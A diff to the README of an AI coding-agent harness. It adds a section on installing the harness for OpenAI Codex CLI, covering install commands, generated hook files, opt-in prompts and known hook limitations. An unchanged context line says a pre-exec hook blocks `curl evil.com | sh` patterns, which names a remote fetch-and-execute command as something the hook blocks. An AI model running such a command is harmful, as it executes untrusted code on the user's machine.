@@ -362,6 +362,67 @@ Behind the scenes:
 - `mcp-pre-exec.sh` enforces MCP allowlist + blocks `curl evil.com | sh` patterns
 - `agentshield-gate.sh` blocks `/uzys:ship` on CRITICAL findings
 
+## Codex CLI support
+
+Beyond Claude Code, this harness can install for **OpenAI Codex CLI** (0.124.0+). Claude Code remains the SSOT — Codex assets are derived via a transform script.
+
+### Install for Codex
+
+Interactive (recommended):
+```bash
+bash <(curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh)
+# Pick: ① tooling   |   2c) CLI: ② Codex
+```
+
+Flag mode (CI / automation):
+```bash
+bash scripts/setup-harness.sh --track tooling --cli codex --project-dir .
+```
+
+`--cli` accepts `claude` (default), `codex`, or `both`. Default is `claude` so existing flows are unaffected.
+
+### What gets installed
+
+For `--cli=codex` or `--cli=both`, after the standard install completes the harness runs `scripts/claude-to-codex.sh` to generate:
+
+```
+<project>/
+├── AGENTS.md                          # generated from .claude/CLAUDE.md
+└── .codex/
+    ├── config.toml                    # sandbox + approval + [[hooks.*]] + [mcp_servers.*]
+    └── hooks/
+        ├── session-start.sh           # session_start
+        ├── hito-counter.sh            # user_prompt_submit
+        └── gate-check.sh              # pre_tool_use matcher="Skill"
+
+~/.codex/skills/uzys-{spec,plan,build,test,review,ship}/SKILL.md   # opt-in (you'll be asked)
+```
+
+Slash commands: Codex doesn't support `:` in slash names, so `/uzys:spec` becomes `/uzys-spec`, etc.
+
+### Two opt-in prompts (touch `~/.codex/`)
+
+After the transform runs, the installer asks:
+
+```
+~/.codex/skills/ 에 uzys-* 6종 설치? [y/N]
+~/.codex/config.toml 에 프로젝트 trust entry 추가? [y/N]
+```
+
+Both default to **No**. Decline = no global mutation. Accept on the second one is required for project-scope `.codex/config.toml` hooks to load.
+
+### Known limitations (Codex 0.124.0 upstream)
+
+- **`pre_tool_use` / `post_tool_use` only fire for the Bash tool** — ApplyPatch (file writes) is not intercepted ([openai/codex#16732](https://github.com/openai/codex/issues/16732)). The harness compensates with `sandbox_mode = "workspace-write"` + `approval_policy = "on-request"` (stronger than a hook in the file-write path).
+- **Project-scope hooks may not load in interactive sessions** ([openai/codex#17532](https://github.com/openai/codex/issues/17532)). `codex exec` (non-interactive) is unaffected.
+
+### References
+
+- Full SPEC: [`docs/specs/codex-compat.md`](./docs/specs/codex-compat.md)
+- Hook strategy ADR: [`docs/decisions/ADR-002-codex-hook-gap.md`](./docs/decisions/ADR-002-codex-hook-gap.md) (Accepted)
+- Compatibility matrix: [`docs/research/codex-compat-matrix-2026-04-24.md`](./docs/research/codex-compat-matrix-2026-04-24.md)
+- Dogfood verification: [`docs/evals/codex-install-2026-04-25.md`](./docs/evals/codex-install-2026-04-25.md)
+
 ## 11 Behavioral Principles
 
 Distilled from Karpathy's LLM observations + Anthropic Harness Design + production agent operations:
